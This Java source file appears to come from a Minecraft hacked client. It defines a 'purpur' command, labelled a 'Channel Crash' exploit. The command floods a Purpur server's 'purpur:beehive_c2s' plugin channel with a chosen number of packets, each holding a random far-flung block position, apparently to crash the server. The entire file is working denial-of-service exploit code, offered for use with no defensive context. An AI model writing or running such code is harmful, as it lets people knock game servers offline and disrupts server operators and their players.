package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.minecraft.command.CommandSource;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.random.Random;
import net.paradise_client.Helper;
import net.paradise_client.command.Command;

public class PurpurExploitCommand extends Command {

    public PurpurExploitCommand() {
        super("purpur", "Purpur Channel Crash");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.then(argument("packets", IntegerArgumentType.integer(1))
                .executes(this::execute));
    }

    private int execute(CommandContext<CommandSource> ctx) {
        int packets = IntegerArgumentType.getInteger(ctx, "packets");
        Helper.printChatMessage("Sending %d packet(s)".formatted(packets));

        new Thread(() -> {
            Random random = Random.create();
            for (int i = 0; i < packets; i++) {
                long position = new BlockPos(
                        random.nextBetween(-30_000_000, 30_000_000),
                        random.nextBetween(250, 254),
                        random.nextBetween(-30_000_000, 30_000_000)
                ).asLong();

                Helper.sendPluginMessage("purpur:beehive_c2s", out -> {
                    out.writeInt(0);
                    out.writeLong(position);
                });

                try {
                    Thread.sleep(50);
                } catch (Exception ignored) {
                    Helper.printChatMessage("[CrashExploit] [PurpurExploit] Unable to sleep 50ms");
                }
            }
        }).start();

        return SINGLE_SUCCESS;
    }
}
